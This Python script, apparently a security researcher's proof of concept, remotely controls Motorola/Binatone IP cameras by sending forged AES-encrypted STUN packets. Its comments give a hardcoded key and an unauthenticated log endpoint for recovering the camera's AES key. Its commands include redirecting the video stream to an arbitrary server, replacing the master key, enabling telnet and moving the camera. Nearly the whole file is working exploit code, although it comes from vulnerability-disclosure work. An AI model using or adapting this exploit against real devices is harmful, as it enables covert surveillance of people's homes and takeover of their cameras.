from Crypto.Cipher import AES
import binascii
import socket
import sys

# Motorola/Binatone IP camera remote control 
# alex.farrant@contextis.co.uk
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


# Usage: python stunning.py move_left
# Sends encrypted STUN UDP message to the camera containing a command
# Camera decrypts it and makes CURL request to internal 'Nuvoton' web server 
# Username is the WLAN MAC address, AES key is available via web interface :)
# Replies to commands are sent back to stun.hubble.in so for many commands this is a blind attack
# For a complete list of commands run strings on /lib/skyeye/plugin_http.so available in the firmware
# https://ota.hubble.in/ota1/0073_patch/0073-01.19.14.tar.gz
# To get the AES key, visit :8080/cgi-bin/logdownload.cgi and decrypt the encrypted logs with (AES) key Cvision12349876
# Alternatively see /mnt/skyeye/etc/skyeye.conf on the camera

# SET ME!
aes_key = "1234567812345678" # 16 bytes
mac = binascii.hexlify("000AE2204FAE") # WLAN MAC. Will start 00:0A:E2
targetIp = "192.168.0.10"
targetPort = 43530 # Change me to your target's UDP port

# GET COMMANDS. Responses are sent back to Hubble
# get_version
# get_resolution
# get_udid


#VIDEO
stopRtmp = "stop_rtmp" # Stop streaming video
startRtmp = "start_rtmp" # Start streaming video
setRtmpServer = "set_wowza_server&value=" # IP | domain
setBrightness = "set_brightness&value=" # (1-10)

# MOVEMENT
moveLeft="move_left"
moveRight="move_right"
moveDown="move_forward" # Down
moveUp="move_backward"
fullLeft="move_left9.9" # Full left...
fullRight="move_right9.9"
fullDown="move_forward9.9"
fullUp="move_backward9.9"

# SECURITY
setStunAESKey = "set_master_key&value=" # Anything you like!
enableTelnet = "enable_telnet&value=" # value=(UDID), See get_udid. Didn't work on a Focus73


iv = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" # IV is sent in every packet (meh)

def encrypt(pt,key):
	pt=iv+pt
	l=len(pt)
	if l != 16 and l != 32 and l != 48 and l != 64 and l != 80 and l != 96:
		padding=""
		pl=0
		while pl != 16 and pl != 32 and pl != 48 and pl != 64 and pl != 80 and pl != 96:
			padding=padding+"_"
			pl = l+len(padding)
		pt=pt+padding
	print "STUN:"+pt
	encryption_suite = AES.new(aes_key, AES.MODE_CBC, iv)
	return encryption_suite.encrypt(pt)


def decrypt(ct,key):
	iv=ct[0:16]
	ct=ct[16:len(ct)]
	decryption_suite = AES.new(aes_key, AES.MODE_CBC, iv)
	return decryption_suite.decrypt(ct)

def pktBody(cmd):
	# Build STUN packet
	# Most of this is ignored. It's really only after the encrypted blob
	fullCmd="action=command&command="+cmd # 23 bytes
	msgType=str("0001") # STUN Binding request
	cookie=str("cccccccc") # redundant bytes for cookie...
	msgId=str("000000000000000000000000") # redundant bytes for msg id....
	unknown=str("802e0004666f7572") # Type: 0x802e, Len: 4, Value: 'four'
	username=str("0006000c")+mac # attrib 0x0006, length=12, MAC address (Username)
	response=str("802b000c313233343536373839303132") # 123456789012
	unknownType=str("8031")
	blob=encrypt(fullCmd,aes_key) # AES blob 
	blobLen="00"+hex(len(blob)).lstrip("0x") # Assuming it's < 255 bytes.
	blob=binascii.hexlify(blob) 	# Hexlify
	mappedAddress=str("000100080001")
	mappedPort=str("7A69") # 31337
	mappedIp=str("ffffffff") # 255.255.255.255 
	XmappedAddress=str("002000089d01")
	XmappedPort=str("7A69") # 31337
	XmappedIp=str("ffffffff") # 255.255.255.255 
	pktBody1=unknown+username+response+unknownType+blobLen
	pktBody2=mappedAddress+mappedPort+mappedIp+XmappedAddress+XmappedPort+XmappedIp
	pktBody=pktBody1+blob+pktBody2
	msgLen=hex(len(pktBody)/2).lstrip("0x") # bytes
	pktHeader=msgType+"00"+msgLen+cookie+msgId
	headLen=str(len(pktHeader)/2) # bytes
	pkt=pktHeader+pktBody
	return pkt


packet = binascii.unhexlify(pktBody(sys.argv[1]))
print packet

# Only for local shennanigans. otherwise you need hping3
#sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#sock.sendto(packet, (targetIp, targetPort))
